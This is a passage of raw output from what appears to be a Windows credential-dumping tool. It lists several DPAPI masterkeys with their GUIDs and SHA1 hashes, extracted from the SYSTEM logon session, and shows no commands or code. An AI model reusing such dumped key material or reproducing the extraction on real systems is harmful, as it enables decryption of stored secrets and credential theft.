                sha1_masterkey a72bb2f3d888269936f60a4deb2ea5fc9382ddfc
        == DPAPI [3e7]==
                luid 999
                key_guid ebae3983-3a61-4bfe-aaa2-65ef2407f990
                masterkey 8cfe2b0d86c7132c307eeb2dc9b087a8fc8f9cd5cd3614ba972a545c69c25203a0f1f073a19ae578688c563600247c8310c8a6b9959cbdd162bce4e57679e92c
                sha1_masterkey a2eea7330bfb0152fc35a71d383f4302c1b43c99
        == DPAPI [3e7]==
                luid 999
                key_guid bd259f91-c96f-4caf-bfa3-49c15751a327
                masterkey a8363766a831a1cbb112a8caaf395dbdaffb0b6b91b915204daf499c40928343a740d1f138a6c799094256b0d89b9896b71d2bcf1c91f5d74f5ff51a4d84b26d
                sha1_masterkey 657e1a9a084abe55305dd0fe46f079c5f8d99a12
        == DPAPI [3e7]==
                luid 999
                key_guid fb59e7ef-84bc-42be-b172-b021638602ab
                masterkey 1efb2936004678d6af9933f68bfd710ea9fd550155cce048041cfb5bb0a6f2cad214c05324060667033bcecccf50e1f12963f694093d176969128dcfb1eb66c9
                sha1_masterkey 936b3065e4b9ea1ae0c79c648ba2a641ee311d38
        == DPAPI [3e7]==
                luid 999
                key_guid 140df65a-433d-482e-8fc4-05c6a60f2024
                masterkey c43638e54c23837c6e58ddff3863d0c6463d46da7c5d6db0dbc377bb34701a1e9ab53532d0cd6f33df53246767e461c4fe87763b93cc4a1c6f24d895976c4bd9
                sha1_masterkey 3cb1abceffbbf542b0b2bcf63cb0568e517fae41
        == DPAPI [3e7]==
                luid 999
                key_guid 9ccbb5e8-66c9-4210-a46c-a72e8f750734
                masterkey cb6dd3fe4b3f3a6afa0520d84b39539205139ebd81b68c49aef5c365d975920331c43fb06990aa3ef8c07860fdda33100d3b4cdf259d02cc02a3114ecf6e7721
                sha1_masterkey a0c3d07ffb66b9d1d3a9e02237d56fde0fc217d1

                                                                   
```